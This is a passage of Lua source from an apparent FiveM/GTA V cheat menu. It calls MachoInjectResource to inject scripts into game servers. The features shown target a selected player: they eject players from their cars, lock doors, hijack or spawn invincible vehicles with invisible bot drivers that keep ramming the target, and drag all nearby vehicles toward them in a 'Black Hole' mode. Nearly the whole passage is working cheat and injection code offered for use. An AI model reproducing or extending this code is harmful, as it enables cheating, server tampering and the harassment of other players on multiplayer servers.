                                   
                                    SetVehicleEngineOn(targetVehicle, true, true, false)
                                    SetVehicleEnginePowerMultiplier(targetVehicle, 1.5)
                                    ModifyVehicleTopSpeed(targetVehicle, 1.3)
                                   
                                    -- حلقة VDM - تستهدف الشخص المختار أصلاً
                                    Citizen.CreateThread(function()
                                        while DoesEntityExist(targetVehicle) and vdmActive do
                                            local originalTarget = GetPlayerPed(originalTargetPlayer)
                                            if DoesEntityExist(originalTarget) then
                                                local targetPos = GetEntityCoords(originalTarget)
                                                local targetHeading = GetEntityHeading(originalTarget)
                                                local forwardVec = GetEntityForwardVector(originalTarget)
                                                local spawnPos = targetPos + forwardVec * 15.0
                                               
                                                SetEntityCoordsNoOffset(targetVehicle, spawnPos.x, spawnPos.y, spawnPos.z, false, false, false)
                                                SetEntityHeading(targetVehicle, targetHeading + 180.0)
                                                PlaceObjectOnGroundProperly(targetVehicle)
                                               
                                                SetVehicleForwardSpeed(targetVehicle, 30.0)
                                                TaskVehicleDriveToCoord(botPed, targetVehicle, targetPos.x, targetPos.y, targetPos.z, 35.0, 0, GetEntityModel(targetVehicle), 786603, 1.0, true)
                                            end
                                           
                                            Citizen.Wait(1500)
                                        end
                                    end)
                                   
                                    SetModelAsNoLongerNeeded(botModel)
                                end
                            end)
                        ]])
                        MachoMenuNotification("Vehicle", "Fast Warp VDM activated - Hunting Player ID: " .. GetPlayerServerId(selectedPlayer))
                    else
                        -- السيارة مشغولة - استخدام الطريقة الأصلية (same logic, IsPlayerActive removed)
                        ClearPedTasksImmediately(playerPed)
                       
                        local originalPos = GetEntityCoords(playerPed)
                        local originalHeading = GetEntityHeading(playerPed)
                       
                        MachoInjectResource("any", [[
                            -- باقي الكود الأصلي للسيارة المشغولة
                            vdmActive = true
                            vdmBotPed = nil
                            vdmVehicle = nil
                            originalTargetPlayer = ]] .. originalTargetPlayer .. [[
                           
                            Citizen.CreateThread(function()
                                local playerPed = PlayerPedId()
                                local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                                local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                                local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                                local originalHeading = ]] .. originalHeading .. [[
                               
                                if targetVehicle ~= 0 then
                                    vdmVehicle = targetVehicle
                                   
                                    SetVehicleDoorsLocked(targetVehicle, 1)
                                    SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                                   
                                    SetEntityVisible(playerPed, false, false)
                                    TaskLeaveVehicle(targetPed, targetVehicle, 0)
                                    SetPedMoveRateOverride(playerPed, 10.0)
                                    ClearPedTasks(playerPed)
                                    SetVehicleForwardSpeed(targetVehicle, 0.0)
                                    TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                                   
                                    local keepHidden = true
                                    Citizen.CreateThread(function()
                                        while keepHidden and vdmActive do
                                            SetEntityVisible(playerPed, false, false)
                                            Citizen.Wait(10)
                                        end
                                    end)
                                   
                                    -- انتظار حتى يحصل على صلاحية السيارة تلقائياً من TaskEnterVehicle
                                    local controlAttempts = 0
                                    while not NetworkHasControlOfEntity(targetVehicle) and vdmActive and controlAttempts < 200 do
                                        Citizen.Wait(50)
                                        controlAttempts = controlAttempts + 1
                                    end
                                   
                                    Citizen.Wait(500)
                                    keepHidden = false
                                   
                                    if not vdmActive then return end
                                   
                                    ClearPedTasksImmediately(playerPed)
                                    SetEntityAsMissionEntity(playerPed, true, true)
                                    SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                    SetEntityHeading(playerPed, originalHeading)
                                   
                                    for i = 1, 50 do
                                        if not vdmActive then break end
                                        SetEntityVisible(playerPed, false, false)
                                        Citizen.Wait(10)
                                    end
                                   
                                    if not vdmActive then return end
                                   
                                    Citizen.Wait(100)
                                    ClearPedTasksImmediately(playerPed)
                                    SetPedMoveRateOverride(playerPed, 1.0)
                                    SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                                    TaskWanderStandard(playerPed, 0.0, 0)
                                    Citizen.Wait(100)
                                    ClearPedTasksImmediately(playerPed)
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(100)
                                   
                                    if not vdmActive then return end
                                   
                                    ClearPedTasksImmediately(playerPed)
                                    SetPedMoveRateOverride(playerPed, 1.0)
                                    SetEntityAsMissionEntity(playerPed, false, false)
                                    SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                    SetEntityHeading(playerPed, originalHeading)
                                    Citizen.Wait(100)
                                    TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)
                                    Citizen.Wait(600)
                                   
                                    if not vdmActive then return end
                                   
                                    ClearPedTasks(playerPed)
                                    SetEntityVisible(playerPed, true, false)
                                    Citizen.Wait(200)
                                   
                                    -- بدء VDM بعد عودة اللاعب
                                    if DoesEntityExist(targetVehicle) and vdmActive and NetworkHasControlOfEntity(targetVehicle) then
                                        SetEntityAsMissionEntity(targetVehicle, true, true)
                                        Citizen.Wait(100)
                                       
                                        if not vdmActive then return end
                                       
                                        SetVehicleDoorsLocked(targetVehicle, 4)
                                        local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(targetVehicle)) - 1
                                        for seat = 0, maxSeats do
                                            local ped = GetPedInVehicleSeat(targetVehicle, seat)
                                            if ped ~= 0 and ped ~= playerPed then
                                                SetPedCanBeDraggedOut(ped, false)
                                                SetPedConfigFlag(ped, 32, true)
                                                TaskWarpPedIntoVehicle(ped, targetVehicle, seat)
                                            end
                                        end
                                       
                                        -- إنشاء بوت للقيادة
                                        local botModel = GetHashKey("mp_m_freemode_01")
                                        RequestModel(botModel)
                                        while not HasModelLoaded(botModel) do
                                            if not vdmActive then return end
                                            Citizen.Wait(0)
                                        end
                                       
                                        if not vdmActive then return end
                                       
                                        local botPed = CreatePed(4, botModel, 0.0, 0.0, 0.0, 0.0, false, false)
                                        vdmBotPed = botPed
                                       
                                        SetEntityAsMissionEntity(botPed, false, false)
                                        SetPedCanBeDraggedOut(botPed, false)
                                        SetPedConfigFlag(botPed, 32, true)
                                        SetPedFleeAttributes(botPed, 0, false)
                                        SetPedCombatAttributes(botPed, 17, true)
                                        SetPedSeeingRange(botPed, 0.0)
                                        SetPedHearingRange(botPed, 0.0)
                                        SetPedAlertness(botPed, 0)
                                        SetPedKeepTask(botPed, true)
                                        SetEntityCollision(botPed, false, false)
                                        SetEntityVisible(botPed, true, false)
                                        NetworkSetEntityInvisibleToNetwork(botPed, true)
                                       
                                        SetPedIntoVehicle(botPed, targetVehicle, -1)
                                        Citizen.Wait(100)
                                       
                                        if not vdmActive then
                                            if DoesEntityExist(botPed) then
                                                DeleteEntity(botPed)
                                            end
                                            return
                                        end
                                       
                                        SetVehicleDoorsLocked(targetVehicle, 4)
                                        SetVehicleEngineOn(targetVehicle, true, true, false)
                                        SetVehicleEnginePowerMultiplier(targetVehicle, 1.5)
                                        ModifyVehicleTopSpeed(targetVehicle, 1.3)
                                       
                                        -- حلقة VDM
                                        Citizen.CreateThread(function()
                                            while DoesEntityExist(targetVehicle) and vdmActive do
                                                local originalTarget = GetPlayerPed(originalTargetPlayer)
                                                if DoesEntityExist(originalTarget) then
                                                    local targetPos = GetEntityCoords(originalTarget)
                                                    local targetHeading = GetEntityHeading(originalTarget)
                                                    local forwardVec = GetEntityForwardVector(originalTarget)
                                                    local spawnPos = targetPos + forwardVec * 15.0
                                                   
                                                    SetEntityCoordsNoOffset(targetVehicle, spawnPos.x, spawnPos.y, spawnPos.z, false, false, false)
                                                    SetEntityHeading(targetVehicle, targetHeading + 180.0)
                                                    PlaceObjectOnGroundProperly(targetVehicle)
                                                   
                                                    SetVehicleForwardSpeed(targetVehicle, 30.0)
                                                    TaskVehicleDriveToCoord(botPed, targetVehicle, targetPos.x, targetPos.y, targetPos.z, 35.0, 0, GetEntityModel(targetVehicle), 786603, 1.0, true)
                                                end
                                               
                                                Citizen.Wait(1500)
                                            end
                                        end)
                                       
                                        SetModelAsNoLongerNeeded(botModel)
                                    end
                                end
                            end)
                        ]])
                        MachoMenuNotification("Vehicle", "VDM Bot activated (occupied vehicle) - Hunting Player ID: " .. GetPlayerServerId(selectedPlayer))
                    end
               
                -- إذا كان الشخص المختار ليس في سيارة - البحث عن السيارات الفارغة
                else
                    local playerPed = PlayerPedId()
                    local targetPos = GetEntityCoords(targetPed)
                    local originalPos = GetEntityCoords(playerPed)
                    local originalHeading = GetEntityHeading(playerPed)
                   
                    -- البحث عن أقرب سيارة فارغة
                    local closestEmptyVehicle = nil
                    local closestDistance = 999999.0
                   
                    for vehicle in EnumerateVehicles() do
                        if DoesEntityExist(vehicle) then
                            local vehiclePos = GetEntityCoords(vehicle)
                            local distance = #(targetPos - vehiclePos)
                           
                            if distance < 100.0 then
                                local isVehicleEmpty = true
                                local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(vehicle)) - 1
                               
                                for seat = -1, maxSeats do
                                    local pedInSeat = GetPedInVehicleSeat(vehicle, seat)
                                    if pedInSeat ~= 0 then
                                        local playerId = NetworkGetPlayerIndexFromPed(pedInSeat)
                                        if playerId ~= -1 then
                                            isVehicleEmpty = false
                                            break
                                        end
                                    end
                                end
                               
                                if isVehicleEmpty and distance < closestDistance then
                                    closestEmptyVehicle = vehicle
                                    closestDistance = distance
                                end
                            end
                        end
                    end
                   
                    if closestEmptyVehicle then
                        -- استخدام الوارب السريع للسيارة الفارغة
                        SetEntityVisible(playerPed, false, false)
                        ClearPedTasksImmediately(playerPed)
                        TaskWarpPedIntoVehicle(playerPed, closestEmptyVehicle, -1)
                        ClearPedTasksImmediately(playerPed)
                        TaskLeaveVehicle(playerPed, closestEmptyVehicle, 0)
                        SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                        SetEntityHeading(playerPed, originalHeading)
                        SetEntityVisible(playerPed, true, false)
                       
                        MachoInjectResource("any", [[
                            vdmActive = true
                            vdmBotPed = nil
                            vdmVehicle = nil
                            originalTargetPlayer = ]] .. originalTargetPlayer .. [[
                           
                            Citizen.CreateThread(function()
                                local targetVehicle = ]] .. closestEmptyVehicle .. [[
                               
                                if DoesEntityExist(targetVehicle) and vdmActive then
                                    vdmVehicle = targetVehicle
                                   
                                    NetworkRequestControlOfEntity(targetVehicle)
                                    SetEntityAsMissionEntity(targetVehicle, true, true)
                                   
                                    -- إنشاء بوت للقيادة
                                    local botModel = GetHashKey("mp_m_freemode_01")
                                    RequestModel(botModel)
                                    while not HasModelLoaded(botModel) do
                                        if not vdmActive then return end
                                        Citizen.Wait(0)
                                    end
                                   
                                    if not vdmActive then return end
                                   
                                    local botPed = CreatePed(4, botModel, 0.0, 0.0, 0.0, 0.0, false, false)
                                    vdmBotPed = botPed
                                   
                                    SetEntityAsMissionEntity(botPed, false, false)
                                    SetPedCanBeDraggedOut(botPed, false)
                                    SetPedConfigFlag(botPed, 32, true)
                                    SetPedFleeAttributes(botPed, 0, false)
                                    SetPedCombatAttributes(botPed, 17, true)
                                    SetPedSeeingRange(botPed, 0.0)
                                    SetPedHearingRange(botPed, 0.0)
                                    SetPedAlertness(botPed, 0)
                                    SetPedKeepTask(botPed, true)
                                    SetEntityCollision(botPed, false, false)
                                    SetEntityVisible(botPed, true, false)
                                    NetworkSetEntityInvisibleToNetwork(botPed, true)
                                   
                                    SetPedIntoVehicle(botPed, targetVehicle, -1)
                                   
                                    SetVehicleDoorsLocked(targetVehicle, 4)
                                    SetVehicleEngineOn(targetVehicle, true, true, false)
                                    SetVehicleEnginePowerMultiplier(targetVehicle, 1.5)
                                    ModifyVehicleTopSpeed(targetVehicle, 1.3)
                                   
                                    -- حلقة VDM
                                    Citizen.CreateThread(function()
                                        while DoesEntityExist(targetVehicle) and vdmActive do
                                            local originalTarget = GetPlayerPed(originalTargetPlayer)
                                            if DoesEntityExist(originalTarget) then
                                                local targetPos = GetEntityCoords(originalTarget)
                                                local targetHeading = GetEntityHeading(originalTarget)
                                                local forwardVec = GetEntityForwardVector(originalTarget)
                                                local spawnPos = targetPos + forwardVec * 15.0
                                               
                                                SetEntityCoordsNoOffset(targetVehicle, spawnPos.x, spawnPos.y, spawnPos.z, false, false, false)
                                                SetEntityHeading(targetVehicle, targetHeading + 180.0)
                                                PlaceObjectOnGroundProperly(targetVehicle)
                                               
                                                SetVehicleForwardSpeed(targetVehicle, 30.0)
                                                TaskVehicleDriveToCoord(botPed, targetVehicle, targetPos.x, targetPos.y, targetPos.z, 35.0, 0, GetEntityModel(targetVehicle), 786603, 1.0, true)
                                            end
                                           
                                            Citizen.Wait(1500)
                                        end
                                    end)
                                   
                                    SetModelAsNoLongerNeeded(botModel)
                                end
                            end)
                        ]])
                        MachoMenuNotification("Vehicle", "Fast Warp - Empty vehicle VDM activated targeting Player ID: " .. GetPlayerServerId(selectedPlayer))
                    else
                        -- لم يتم العثور على سيارة فارغة - البحث عن أقرب سيارة بها لاعب حقيقي
                        local closestOccupiedVehicle = nil
                        local closestOccupiedDistance = 999999.0
                        local occupiedVehicleOwner = nil
                       
                        for vehicle in EnumerateVehicles() do
                            if DoesEntityExist(vehicle) then
                                local vehiclePos = GetEntityCoords(vehicle)
                                local distance = #(targetPos - vehiclePos)
                               
                                if distance < 100.0 then
                                    local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(vehicle)) - 1
                                   
                                    for seat = -1, maxSeats do
                                        local pedInSeat = GetPedInVehicleSeat(vehicle, seat)
                                        if pedInSeat ~= 0 then
                                            local playerId = NetworkGetPlayerIndexFromPed(pedInSeat)
                                            if playerId ~= -1 and distance < closestOccupiedDistance then
                                                closestOccupiedVehicle = vehicle
                                                closestOccupiedDistance = distance
                                                occupiedVehicleOwner = playerId
                                                break
                                            end
                                        end
                                    end
                                end
                            end
                        end
                       
                        if closestOccupiedVehicle and occupiedVehicleOwner then
                            -- استخدام نفس خوارزمية TaskEnterVehicle للسيارة المشغولة
                            ClearPedTasksImmediately(playerPed)
                           
                            MachoInjectResource("any", [[
                                vdmActive = true
                                vdmBotPed = nil
                                vdmVehicle = nil
                                originalTargetPlayer = ]] .. originalTargetPlayer .. [[
                               
                                Citizen.CreateThread(function()
                                    local playerPed = PlayerPedId()
                                    local targetVehicle = ]] .. closestOccupiedVehicle .. [[
                                    local vehicleOwnerPed = GetPlayerPed(]] .. occupiedVehicleOwner .. [[)
                                    local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                                    local originalHeading = ]] .. originalHeading .. [[
                                   
                                    if targetVehicle ~= 0 then
                                        vdmVehicle = targetVehicle
                                       
                                        SetVehicleDoorsLocked(targetVehicle, 1)
                                        SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                                       
                                        SetEntityVisible(playerPed, false, false)
                                        TaskLeaveVehicle(vehicleOwnerPed, targetVehicle, 0)
                                        SetPedMoveRateOverride(playerPed, 10.0)
                                        ClearPedTasks(playerPed)
                                        SetVehicleForwardSpeed(targetVehicle, 0.0)
                                        TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                                       
                                        local keepHidden = true
                                        Citizen.CreateThread(function()
                                            while keepHidden and vdmActive do
                                                SetEntityVisible(playerPed, false, false)
                                                Citizen.Wait(10)
                                            end
                                        end)
                                       
                                        -- انتظار حتى يحصل على صلاحية السيارة تلقائياً من TaskEnterVehicle
                                        local controlAttempts = 0
                                        while not NetworkHasControlOfEntity(targetVehicle) and vdmActive and controlAttempts < 200 do
                                            Citizen.Wait(50)
                                            controlAttempts = controlAttempts + 1
                                        end
                                       
                                        Citizen.Wait(500)
                                        keepHidden = false
                                       
                                        if not vdmActive then return end
                                       
                                        ClearPedTasksImmediately(playerPed)
                                        SetEntityAsMissionEntity(playerPed, true, true)
                                        SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                        SetEntityHeading(playerPed, originalHeading)
                                       
                                        for i = 1, 50 do
                                            if not vdmActive then break end
                                            SetEntityVisible(playerPed, false, false)
                                            Citizen.Wait(10)
                                        end
                                       
                                        if not vdmActive then return end
                                       
                                        Citizen.Wait(100)
                                        ClearPedTasksImmediately(playerPed)
                                        SetPedMoveRateOverride(playerPed, 1.0)
                                        SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                                        TaskWanderStandard(playerPed, 0.0, 0)
                                        Citizen.Wait(100)
                                        ClearPedTasksImmediately(playerPed)
                                        SetEntityVisible(playerPed, false, false)
                                        Citizen.Wait(100)
                                       
                                        if not vdmActive then return end
                                       
                                        ClearPedTasksImmediately(playerPed)
                                        SetPedMoveRateOverride(playerPed, 1.0)
                                        SetEntityAsMissionEntity(playerPed, false, false)
                                        SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                        SetEntityHeading(playerPed, originalHeading)
                                        Citizen.Wait(100)
                                        TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)
                                        Citizen.Wait(600)
                                       
                                        if not vdmActive then return end
                                       
                                        ClearPedTasks(playerPed)
                                        SetEntityVisible(playerPed, true, false)
                                        Citizen.Wait(200)
                                       
                                        -- بدء VDM بعد عودة اللاعب
                                        if DoesEntityExist(targetVehicle) and vdmActive and NetworkHasControlOfEntity(targetVehicle) then
                                            SetEntityAsMissionEntity(targetVehicle, true, true)
                                            Citizen.Wait(100)
                                           
                                            if not vdmActive then return end
                                           
                                            SetVehicleDoorsLocked(targetVehicle, 4)
                                            local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(targetVehicle)) - 1
                                            for seat = 0, maxSeats do
                                                local ped = GetPedInVehicleSeat(targetVehicle, seat)
                                                if ped ~= 0 and ped ~= playerPed then
                                                    SetPedCanBeDraggedOut(ped, false)
                                                    SetPedConfigFlag(ped, 32, true)
                                                    TaskWarpPedIntoVehicle(ped, targetVehicle, seat)
                                                end
                                            end
                                           
                                            -- إنشاء بوت للقيادة
                                            local botModel = GetHashKey("mp_m_freemode_01")
                                            RequestModel(botModel)
                                            while not HasModelLoaded(botModel) do
                                                if not vdmActive then return end
                                                Citizen.Wait(0)
                                            end
                                           
                                            if not vdmActive then return end
                                           
                                            local botPed = CreatePed(4, botModel, 0.0, 0.0, 0.0, 0.0, false, false)
                                            vdmBotPed = botPed
                                           
                                            SetEntityAsMissionEntity(botPed, false, false)
                                            SetPedCanBeDraggedOut(botPed, false)
                                            SetPedConfigFlag(botPed, 32, true)
                                            SetPedFleeAttributes(botPed, 0, false)
                                            SetPedCombatAttributes(botPed, 17, true)
                                            SetPedSeeingRange(botPed, 0.0)
                                            SetPedHearingRange(botPed, 0.0)
                                            SetPedAlertness(botPed, 0)
                                            SetPedKeepTask(botPed, true)
                                            SetEntityCollision(botPed, false, false)
                                            SetEntityVisible(botPed, true, false)
                                            NetworkSetEntityInvisibleToNetwork(botPed, true)
                                           
                                            SetPedIntoVehicle(botPed, targetVehicle, -1)
                                            Citizen.Wait(100)
                                           
                                            if not vdmActive then
                                                if DoesEntityExist(botPed) then
                                                    DeleteEntity(botPed)
                                                end
                                                return
                                            end
                                           
                                            SetVehicleDoorsLocked(targetVehicle, 4)
                                            SetVehicleEngineOn(targetVehicle, true, true, false)
                                            SetVehicleEnginePowerMultiplier(targetVehicle, 1.5)
                                            ModifyVehicleTopSpeed(targetVehicle, 1.3)
                                           
                                            -- حلقة VDM
                                            Citizen.CreateThread(function()
                                                while DoesEntityExist(targetVehicle) and vdmActive do
                                                    local originalTarget = GetPlayerPed(originalTargetPlayer)
                                                    if DoesEntityExist(originalTarget) then
                                                        local targetPos = GetEntityCoords(originalTarget)
                                                        local targetHeading = GetEntityHeading(originalTarget)
                                                        local forwardVec = GetEntityForwardVector(originalTarget)
                                                        local spawnPos = targetPos + forwardVec * 15.0
                                                       
                                                        SetEntityCoordsNoOffset(targetVehicle, spawnPos.x, spawnPos.y, spawnPos.z, false, false, false)
                                                        SetEntityHeading(targetVehicle, targetHeading + 180.0)
                                                        PlaceObjectOnGroundProperly(targetVehicle)
                                                       
                                                        SetVehicleForwardSpeed(targetVehicle, 30.0)
                                                        TaskVehicleDriveToCoord(botPed, targetVehicle, targetPos.x, targetPos.y, targetPos.z, 35.0, 0, GetEntityModel(targetVehicle), 786603, 1.0, true)
                                                    end
                                                   
                                                    Citizen.Wait(1500)
                                                end
                                            end)
                                           
                                            SetModelAsNoLongerNeeded(botModel)
                                        end
                                    end
                                end)
                            ]])
                            MachoMenuNotification("Vehicle", "Fallback VDM - Using occupied vehicle targeting Player ID: " .. GetPlayerServerId(selectedPlayer))
                        else
                            -- لم يتم العثور على أي سيارة - إنشاء سيارة جديدة
                            local function spawnVehicle(vtype, name, pos, user_id, autoSeat)
                                local mhash = GetHashKey(name)
                                RequestModel(mhash)
                                
                                local timeout = 0
                                while not HasModelLoaded(mhash) and timeout < 8000 do
                                    Citizen.Wait(100)
                                    timeout = timeout + 100
                                end
                                
                                if not HasModelLoaded(mhash) then
                                    return false
                                end
                                local x, y, z = table.unpack(pos or GetEntityCoords(PlayerPedId()))
                                local heading = GetEntityHeading(PlayerPedId()) + math.random(-180, 180)
                                
                                local vehicle = CreateVehicle(mhash, x, y, z, heading, true, false)
                                
                                if DoesEntityExist(vehicle) then
                                    SetVehicleOnGroundProperly(vehicle)
                                    SetVehicleNumberPlateText(vehicle, "CHAOS" .. math.random(1,99))
                                    SetModelAsNoLongerNeeded(mhash)
                                    SetEntityInvincible(vehicle, true)
                                    SetVehicleBodyHealth(vehicle, 50000.0)
                                    SetVehicleEngineHealth(vehicle, 50000.0)
                                    SetVehicleUndriveable(vehicle, false)
                                    NetworkRegisterEntityAsNetworked(vehicle)
                                    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(vehicle), false)
                                    
                                    -- ضمان التحكم في المركبة
                                    SetEntityAsMissionEntity(vehicle, true, true)
                                    NetworkRequestControlOfEntity(vehicle)
                                    
                                    return vehicle
                                else
                                    SetModelAsNoLongerNeeded(mhash)
                                    return false
                                end
                            end
                            
                            -- قائمة السيارات المستثناة
                            local excludedVehicles = {
                                "stunt",
                                "avisa",
                                "marshall"
                            }
                            
                            -- الحصول على جميع نماذج السيارات المتاحة في اللعبة
                            local vehicleModels = GetAllVehicleModels()
                            
                            -- فلترة السيارات المستثناة
                            local filteredVehicles = {}
                            for i = 1, #vehicleModels do
                                local vehicleModel = vehicleModels[i]
                                local shouldInclude = true
                                for _, excludedName in ipairs(excludedVehicles) do
                                    if string.find(string.lower(vehicleModel), string.lower(excludedName)) then
                                        shouldInclude = false
                                        break
                                    end
                                end
                                if shouldInclude then
                                    table.insert(filteredVehicles, vehicleModel)
                                end
                            end
                            
                            -- اختيار سيارة عشوائية
                            local randomVehicle = filteredVehicles[math.random(1, #filteredVehicles)]
                            
                            -- إنشاء السيارة بالقرب من الهدف
                            local spawnPos = targetPos + vector3(math.random(-10, 10), math.random(-10, 10), 2.0)
                            local spawnedVehicle = spawnVehicle("car", randomVehicle, {spawnPos.x, spawnPos.y, spawnPos.z}, math.random(1000, 9999), false)
                            
                            if spawnedVehicle then
                                -- استخدام الوارب السريع للسيارة المُنشأة
                                SetEntityVisible(playerPed, false, false)
                                ClearPedTasksImmediately(playerPed)
                                TaskWarpPedIntoVehicle(playerPed, spawnedVehicle, -1)
                                ClearPedTasksImmediately(playerPed)
                                TaskLeaveVehicle(playerPed, spawnedVehicle, 0)
                                SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                SetEntityHeading(playerPed, originalHeading)
                                SetEntityVisible(playerPed, true, false)
                               
                                MachoInjectResource("any", [[
                                    vdmActive = true
                                    vdmBotPed = nil
                                    vdmVehicle = nil
                                    originalTargetPlayer = ]] .. originalTargetPlayer .. [[
                                   
                                    Citizen.CreateThread(function()
                                        local targetVehicle = ]] .. spawnedVehicle .. [[
                                       
                                        if DoesEntityExist(targetVehicle) and vdmActive then
                                            vdmVehicle = targetVehicle
                                           
                                            NetworkRequestControlOfEntity(targetVehicle)
                                            SetEntityAsMissionEntity(targetVehicle, true, true)
                                           
                                            -- إنشاء بوت للقيادة
                                            local botModel = GetHashKey("mp_m_freemode_01")
                                            RequestModel(botModel)
                                            while not HasModelLoaded(botModel) do
                                                if not vdmActive then return end
                                                Citizen.Wait(0)
                                            end
                                           
                                            if not vdmActive then return end
                                           
                                            local botPed = CreatePed(4, botModel, 0.0, 0.0, 0.0, 0.0, false, false)
                                            vdmBotPed = botPed
                                           
                                            SetEntityAsMissionEntity(botPed, false, false)
                                            SetPedCanBeDraggedOut(botPed, false)
                                            SetPedConfigFlag(botPed, 32, true)
                                            SetPedFleeAttributes(botPed, 0, false)
                                            SetPedCombatAttributes(botPed, 17, true)
                                            SetPedSeeingRange(botPed, 0.0)
                                            SetPedHearingRange(botPed, 0.0)
                                            SetPedAlertness(botPed, 0)
                                            SetPedKeepTask(botPed, true)
                                            SetEntityCollision(botPed, false, false)
                                            SetEntityVisible(botPed, true, false)
                                            NetworkSetEntityInvisibleToNetwork(botPed, true)
                                           
                                            SetPedIntoVehicle(botPed, targetVehicle, -1)
                                           
                                            SetVehicleDoorsLocked(targetVehicle, 4)
                                            SetVehicleEngineOn(targetVehicle, true, true, false)
                                            SetVehicleEnginePowerMultiplier(targetVehicle, 1.5)
                                            ModifyVehicleTopSpeed(targetVehicle, 1.3)
                                           
                                            -- حلقة VDM
                                            Citizen.CreateThread(function()
                                                while DoesEntityExist(targetVehicle) and vdmActive do
                                                    local originalTarget = GetPlayerPed(originalTargetPlayer)
                                                    if DoesEntityExist(originalTarget) then
                                                        local targetPos = GetEntityCoords(originalTarget)
                                                        local targetHeading = GetEntityHeading(originalTarget)
                                                        local forwardVec = GetEntityForwardVector(originalTarget)
                                                        local spawnPos = targetPos + forwardVec * 15.0
                                                       
                                                        SetEntityCoordsNoOffset(targetVehicle, spawnPos.x, spawnPos.y, spawnPos.z, false, false, false)
                                                        SetEntityHeading(targetVehicle, targetHeading + 180.0)
                                                        PlaceObjectOnGroundProperly(targetVehicle)
                                                       
                                                        SetVehicleForwardSpeed(targetVehicle, 30.0)
                                                        TaskVehicleDriveToCoord(botPed, targetVehicle, targetPos.x, targetPos.y, targetPos.z, 35.0, 0, GetEntityModel(targetVehicle), 786603, 1.0, true)
                                                    end
                                                   
                                                    Citizen.Wait(1500)
                                                end
                                            end)
                                           
                                            SetModelAsNoLongerNeeded(botModel)
                                        end
                                    end)
                                ]])
                                MachoMenuNotification("Vehicle", "Spawned new vehicle VDM - " .. randomVehicle .. " targeting Player ID: " .. GetPlayerServerId(selectedPlayer))
                            else
                                MachoMenuNotification("Error", "Failed to spawn vehicle for VDM")
                            end
                        end
                    end
                end
            else
                MachoMenuNotification("Error", "Player not found")
            end
        else
            MachoMenuNotification("Error", "No player selected")
        end
    end,
    function()
        enableVDM = false
        MachoInjectResource("any", [[
            vdmActive = false
        ]])
        MachoMenuNotification("Vehicle", "VDM Bot deactivated")
    end
)
MachoMenuCheckbox(PlayerSection, "Black Hole", 
    function()
        enableBlackHole = true
        local selectedPlayer = MachoMenuGetSelectedPlayer()  
        if selectedPlayer and selectedPlayer ~= -1 then      
            local targetPed = GetPlayerPed(selectedPlayer)   
            if targetPed and DoesEntityExist(targetPed) then
                local originalTargetPlayer = selectedPlayer
                
                MachoInjectResource("any", [[
                    blackHoleActive = true
                    originalTargetPlayer = ]] .. originalTargetPlayer .. [[
                    
                    Citizen.CreateThread(function()
                        while blackHoleActive do
                            local targetPed = GetPlayerPed(originalTargetPlayer)
                            -- التأكد من وجود الشخص المحدد فقط
                            if DoesEntityExist(targetPed) then
                                local targetPos = GetEntityCoords(targetPed)
                                
                                -- البحث عن جميع السيارات في نطاق 200 متر
                                local handle, vehicle = FindFirstVehicle()
                                local success
                                repeat
                                    if DoesEntityExist(vehicle) then
                                        local vehiclePos = GetEntityCoords(vehicle)
                                        local distance = #(targetPos - vehiclePos)
                                        
                                                if distance < 400.0 and distance > 2.0 then -- تجنب السيارات القريبة جداً
                                            -- فحص الصلاحية على السيارة
                                            NetworkRequestControlOfEntity(vehicle)
                                            local hasControl = NetworkHasControlOfEntity(vehicle)
                                            
                                            if hasControl then
                                                -- عنده صلاحية - جذب عادي
                                                local direction = targetPos - vehiclePos
                                                direction = direction / #direction
                                                local force = 80.0
                                                local velocity = direction * force
                                                SetEntityVelocity(vehicle, velocity.x, velocity.y, velocity.z)
                                            else
                                                -- ماعنده صلاحية - فحص إذا السيارة فارغة
                                                local isVehicleEmpty = true
                                                local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(vehicle)) - 1
                                                
                                                for seat = -1, maxSeats do
                                                    local pedInSeat = GetPedInVehicleSeat(vehicle, seat)
                                                    if pedInSeat ~= 0 then
                                                        local playerId = NetworkGetPlayerIndexFromPed(pedInSeat)
                                                        if playerId ~= -1 then
                                                            isVehicleEmpty = false
                                                            break
                                                        end
                                                    end
                                                end
                                                
                                                if isVehicleEmpty then
                                                    -- السيارة فارغة - وارب سريع جداً بدون أي انتظار
                                                    local playerPed = PlayerPedId()
                                                    local originalPos = GetEntityCoords(playerPed)
                                                    local originalHeading = GetEntityHeading(playerPed)
                                                    
                                                    SetEntityVisible(playerPed, false, false)
                                                    ClearPedTasksImmediately(playerPed)
                                                    TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                                    ClearPedTasksImmediately(playerPed)
                                                    TaskLeaveVehicle(playerPed, vehicle, 0)
